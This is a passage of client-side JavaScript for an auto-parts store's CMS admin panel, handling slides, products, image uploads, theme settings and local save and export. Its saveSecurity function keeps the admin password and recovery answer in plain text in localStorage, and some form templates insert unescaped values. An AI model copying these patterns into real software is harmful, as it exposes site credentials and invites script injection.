                <div class="form-row">
                    <div class="form-group"><label class="lbl">CTA 1 Text</label><input type="text" id="slide-${i}-cta" value="${s.cta}"></div>
                    <div class="form-group"><label class="lbl">CTA 1 Link</label><input type="text" id="slide-${i}-ctaLink" value="${s.ctaLink || ''}" placeholder="/shop-now"></div>
                </div>
                <div class="form-row">
                    <div class="form-group"><label class="lbl">CTA 2 Text</label><input type="text" id="slide-${i}-cta2" value="${s.cta2}"></div>
                    <div class="form-group"><label class="lbl">CTA 2 Link</label><input type="text" id="slide-${i}-cta2Link" value="${s.cta2Link || ''}" placeholder="/learn-more"></div>
                </div>
            </div>
        </div>
    `).join('');
}


// ------ Array & Reordering Utils ------
function arrDel(key, idx) { collectAll(); data[key].splice(idx, 1); }

// ------ Array Utils (Handled by Rerendering Functions) ------

// ------ File Upload Utils ------
function fileToDataUrl(file) {
    return new Promise((res, rej) => {
        const r = new FileReader();
        r.onload = e => res(e.target.result);
        r.onerror = rej;
        r.readAsDataURL(file);
    });
}

function handleFileInput(input, targetId) {
    const file = input.files[0]; if (!file) return;
    fileToDataUrl(file).then(url => {
        document.getElementById(targetId).value = '(local image)';
        document.getElementById(targetId + '-preview').src = url;
        data.siteIdentity.logoUrl = url;
    });
}
function pickFile(id) { document.getElementById(id).click(); }

let slideFileTarget = 0;
function pickSlideFile(i) { slideFileTarget = i; document.getElementById('slide-file-input').click(); }
async function slideFileChanged() {
    const file = this.files[0]; if (!file) return;
    const url = await fileToDataUrl(file);
    data.slides[slideFileTarget].bg = url;
    document.getElementById('slide-' + slideFileTarget + '-bg').value = '(local image)';
    document.getElementById('preview-' + slideFileTarget).style.backgroundImage = "url('" + url + "')";
    showToast('Slide updated');
}
async function dropSlide(e, i) {
    e.preventDefault();
    const file = e.dataTransfer.files[0]; if (!file || !file.type.startsWith('image/')) return;
    const url = await fileToDataUrl(file);
    data.slides[i].bg = url;
    document.getElementById('slide-' + i + '-bg').value = '(local image)';
    document.getElementById('preview-' + i).style.backgroundImage = "url('" + url + "')";
    showToast('Slide updated');
}

let prodFileTarget = null;
function pickProdFile(section, idx) { prodFileTarget = { section, idx }; document.getElementById('prod-file-input').click(); }
async function prodFileChanged() {
    const file = this.files[0]; if (!file) return;
    const url = await fileToDataUrl(file);
    const { section, idx } = prodFileTarget;
    if (section === 'fp') {
        data.featuredProducts[idx].img = url;
        const inp = document.getElementById('fp-' + idx + '-img'); if (inp) inp.value = '(local image)';
        document.querySelector('#fp-row-' + idx + ' .img-thumb').src = url;
    } else if (section === 'ap') {
        const catId = document.getElementById('prod-category-select').value;
        const cat = data.categories.find(c => c.id === catId);
        if (cat) {
            cat.products[idx].img = url;
            const inp = document.getElementById('ap-' + idx + '-img'); if (inp) inp.value = '(local image)';
            document.querySelector(`#ap-row-${idx} .img-thumb`).src = url;
        }
    } else {
        data.categories[activeCatIdx].products[idx].img = url;
        const inp = document.getElementById('cp-' + idx + '-img'); if (inp) inp.value = '(local image)';
        const thumb = document.getElementById('cp-' + idx + '-imgthumb'); if (thumb) thumb.src = url;
    }
    showToast('Image uploaded');
}

async function dropProdImage(e, section, idx) {
    e.preventDefault();
    const target = e.currentTarget;
    target.style.borderColor = 'var(--border)';
    const file = e.dataTransfer.files[0];
    if (!file || !file.type.startsWith('image/')) return;

    const url = await fileToDataUrl(file);
    if (section === 'fp') {
        data.featuredProducts[idx].img = url;
        const inp = document.getElementById('fp-' + idx + '-img');
        if (inp) inp.value = '(local image)';
        target.src = url;
    } else {
        data.categories[activeCatIdx].products[idx].img = url;
        const inp = document.getElementById('cp-' + idx + '-img');
        if (inp) inp.value = '(local image)';
        target.src = url;
    }
    showToast('Image updated via drop');
}

// ------ Missing Core UI Logic ------
function showPanel(id) {
    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));

    const panel = document.getElementById('panel-' + id);
    if (panel) panel.classList.add('active');

    const navItem = Array.from(document.querySelectorAll('.nav-item')).find(n => n.getAttribute('onclick')?.includes(`'${id}'`));
    if (navItem) navItem.classList.add('active');
}

function collectAll() {
    collectIdentity();
    collectNav();
    collectFooter();
    collectSlides();
    collectTrust();
    collectBrands();
    collectTopCats();
    collectFP();
    collectCtaBanner();
    collectCat();
    collectAllProducts();
    collectTheme();
}

function saveAll() {
    collectAll();
    localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
    showToast('All changes saved to local storage!');
}

function resetAll() {
    if (confirm('Reset all CMS data to defaults? This cannot be undone.')) {
        data = JSON.parse(JSON.stringify(DEFAULT_DATA));
        saveAll();
        renderAll();
    }
}

function exportData() {
    collectAll();
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `spareblaze_cms_${new Date().toISOString().split('T')[0]}.json`;
    a.click();
}

function showToast(msg) {
    const t = document.getElementById('toast');
    t.textContent = msg;
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 3000);
}

// ------ Individual Collectors (Missing/Extended) ------
function collectIdentity() {
    data.siteIdentity.siteName = document.getElementById('si-name').value;
    data.siteIdentity.tagline = document.getElementById('si-tagline').value;
    data.siteIdentity.copyright = document.getElementById('si-copyright').value;
    const img = document.getElementById('si-logo');
    if (img && !img.value.startsWith('(')) data.siteIdentity.logoUrl = img.value;
}

function collectNav() {
    data.navLinks = [];
    document.querySelectorAll('#nav-links-tbody tr').forEach((tr, i) => {
        data.navLinks.push({
            label: document.getElementById(`nl-${i}-lbl`).value,
            href: document.getElementById(`nl-${i}-href`).value
        });
    });
}

function collectFooter() {
    data.footer.phone = document.getElementById('f-phone').value;
    data.footer.email = document.getElementById('f-email').value;
    data.footer.address = document.getElementById('f-address').value;
    data.footer.instagram = document.getElementById('f-instagram').value;
    data.footer.facebook = document.getElementById('f-facebook').value;
    data.footer.twitter = document.getElementById('f-twitter').value;
    data.footer.youtube = document.getElementById('f-youtube').value;
}

function collectSlides() {
    data.slides.forEach((s, i) => {
        const bg = document.getElementById(`slide-${i}-bg`); if (bg && !bg.value.startsWith('(')) s.bg = bg.value;
        s.badge = document.getElementById(`slide-${i}-badge`).value;
        s.highlight = document.getElementById(`slide-${i}-highlight`).value;
        s.headline = document.getElementById(`slide-${i}-headline`).value;
        s.subtitle = document.getElementById(`slide-${i}-subtitle`).value;
        s.cta = document.getElementById(`slide-${i}-cta`).value;
        s.ctaLink = document.getElementById(`slide-${i}-ctaLink`).value;
        s.cta2 = document.getElementById(`slide-${i}-cta2`).value;
        s.cta2Link = document.getElementById(`slide-${i}-cta2Link`).value;
    });
}

function collectTrust() {
    data.trustBar = [];
    document.querySelectorAll('#trust-tbody tr').forEach((tr, i) => {
        data.trustBar.push({
            icon: document.getElementById(`tb-${i}-ico`).value,
            text: document.getElementById(`tb-${i}-txt`).value
        });
    });
}

function collectBrands() {
    data.carBrands = [];
    document.querySelectorAll('#brands-tbody tr').forEach((tr, i) => {
        data.carBrands.push({
            label: document.getElementById(`cb-${i}-lbl`).value,
            id: document.getElementById(`cb-${i}-id`).value
        });
    });
}

function collectTopCats() {
    data.topCategories = [];
    document.querySelectorAll('#topcats-tbody tr').forEach((tr, i) => {
        data.topCategories.push({
            icon: document.getElementById(`tc-${i}-ico`).value,
            color: document.getElementById(`tc-${i}-clr`).value,
            name: document.getElementById(`tc-${i}-name`).value,
            href: document.getElementById(`tc-${i}-href`).value
        });
    });
}

function collectCtaBanner() {
    data.ctaBanner.headline = document.getElementById('cta-headline').value;
    data.ctaBanner.desc = document.getElementById('cta-desc').value;
    data.ctaBanner.btnText = document.getElementById('cta-btn').value;
}

// ------ All Products & Theme Logic ------
function renderAllProductsTable() {
    const catId = document.getElementById('prod-category-select').value;
    // Add listener only once
    const select = document.getElementById('prod-category-select');
    if (select && !select.dataset.listenerSet) {
        select.addEventListener('change', renderAllProductsTable);
        select.dataset.listenerSet = 'true';
    }
    let cat = data.categories.find(c => c.id === catId);

    // Find existing global data if available
    const globalDataMap = {
        'after-market': typeof afterMarketProducts !== 'undefined' ? afterMarketProducts : null,
        'refurbished': typeof refurbishedProducts !== 'undefined' ? refurbishedProducts : null,
        'used': typeof usedProducts !== 'undefined' ? usedProducts : null,
        'oem': typeof oemProducts !== 'undefined' ? oemProducts : null,
        'wholesale': typeof wholesaleProducts !== 'undefined' ? wholesaleProducts : null
    };

    if ((!cat || !cat.products || cat.products.length === 0) && globalDataMap[catId]) {
        const initialProducts = globalDataMap[catId].map(p => ({
            name: p.title || p.name,
            price: parseFloat(String(p.amount || p.price).replace(/[^0-9.]/g, '')),
            mrp: parseFloat(String(p.originalPrice || p.mrp || 0).replace(/[^0-9.]/g, '')),
            brand: p.brand || '',
            vehicle: p.vehicle || '',
            label: p.badge || p.label || '',
            stock: p.stock || 'In Stock',
            img: p.image || p.img || ''
        }));

        if (!cat) {
            cat = { id: catId, title: catId.replace(/-/g, ' '), products: initialProducts };
            data.categories.push(cat);
        } else {
            cat.products = initialProducts;
        }
    }

    if (!cat) {
        document.getElementById('allproducts-tbody').innerHTML = '<tr><td colspan="9" style="text-align:center;padding:2rem;color:var(--muted)">No products found for this category.</td></tr>';
        return;
    }

    document.getElementById('allproducts-tbody').innerHTML = cat.products.map((p, i) => `
        <tr id="ap-row-${i}">
            <td><img class="img-thumb" src="${p.img || 'https://dummyimage.com/40x40/20243a/888'}" 
                     onclick="pickProdFile('ap',${i})" 
                     onerror="this.src='https://dummyimage.com/40x40/20243a/888'"></td>
            <td><input type="text" id="ap-${i}-name" value="${esc(p.name)}"></td>
            <td><input type="text" id="ap-${i}-brand" value="${esc(p.brand || '')}" style="width:85px"></td>
            <td><input type="text" id="ap-${i}-vehicle" value="${esc(p.vehicle || '')}" style="width:100px"></td>
            <td><input type="number" id="ap-${i}-price" value="${p.price}" style="width:75px"></td>
            <td><input type="number" id="ap-${i}-mrp" value="${p.mrp}" style="width:75px"></td>
            <td><input type="text" id="ap-${i}-label" value="${esc(p.label || '')}" style="width:80px"></td>
            <td><select id="ap-${i}-stock" style="width:80px">
                <option value="In Stock" ${p.stock === 'In Stock' ? 'selected' : ''}>In Stock</option>
                <option value="Out of Stock" ${p.stock === 'Out of Stock' ? 'selected' : ''}>Out of Stock</option>
            </select></td>
            <td>
                <div style="display:flex;gap:.3rem">
                    <button class="btn btn-danger btn-sm" onclick="arrDelAllProd(${i})"><i class="fa-solid fa-trash"></i></button>
                    <input type="hidden" id="ap-${i}-img" value="${p.img.startsWith('data:') ? '(local image)' : esc(p.img)}">
                </div>
            </td>
        </tr>
    `).join('');
}

function addAllProduct() {
    const catId = document.getElementById('prod-category-select').value;
    const cat = data.categories.find(c => c.id === catId);
    if (!cat) return;
    collectAllProducts();
    cat.products.push({ name: 'New Product', price: 0, mrp: 0, brand: '', vehicle: '', label: '', stock: 'In Stock', img: '' });
    renderAllProductsTable();
}

function arrDelAllProd(i) {
    const catId = document.getElementById('prod-category-select').value;
    const cat = data.categories.find(c => c.id === catId);
    if (!cat) return;
    collectAllProducts();
    cat.products.splice(i, 1);
    renderAllProductsTable();
}

function collectAllProducts() {
    const catId = document.getElementById('prod-category-select').value;
    const cat = data.categories.find(c => c.id === catId);
    if (!cat) return;
    cat.products.forEach((p, i) => {
        const n = document.getElementById(`ap-${i}-name`); if (n) p.name = n.value;
        const b = document.getElementById(`ap-${i}-brand`); if (b) p.brand = b.value;
        const v = document.getElementById(`ap-${i}-vehicle`); if (v) p.vehicle = v.value;
        const pr = document.getElementById(`ap-${i}-price`); if (pr) p.price = parseInt(pr.value) || 0;
        const m = document.getElementById(`ap-${i}-mrp`); if (m) p.mrp = parseInt(m.value) || 0;
        const l = document.getElementById(`ap-${i}-label`); if (l) p.label = l.value;
        const s = document.getElementById(`ap-${i}-stock`); if (s) p.stock = s.value;
        const img = document.getElementById(`ap-${i}-img`); if (img && !img.value.startsWith('(')) p.img = img.value;
    });
}

function renderTheme() {
    document.getElementById('theme-primary').value = data.theme.primary;
    document.getElementById('theme-primary-soft').value = data.theme.primarySoft;
    document.getElementById('theme-font').value = data.theme.fontFamily;
}

function collectTheme() {
    data.theme.primary = document.getElementById('theme-primary').value;
    data.theme.primarySoft = document.getElementById('theme-primary-soft').value;
    data.theme.fontFamily = document.getElementById('theme-font').value;
}

function saveSecurity() {
    const u = document.getElementById('sec-username').value;
    const p = document.getElementById('sec-p').value;
    const q = document.getElementById('sec-q').value;
    const a = document.getElementById('sec-a').value;

    if (u) {
        const creds = getCreds();
        creds.u = u;
        if (p) creds.p = p;
        localStorage.setItem(CRED_KEY, JSON.stringify(creds));
    }
    if (q && a) {
        localStorage.setItem(RECOVERY_KEY, JSON.stringify({ q, a }));
    }
    showToast('Security settings updated!');
}

function renderSecurity() {
    const creds = getCreds();
    const recovery = getRecovery();
    document.getElementById('sec-username').value = creds.u;
    document.getElementById('sec-q').value = recovery.q;
    document.getElementById('sec-a').value = recovery.a;
}

// Init
init();

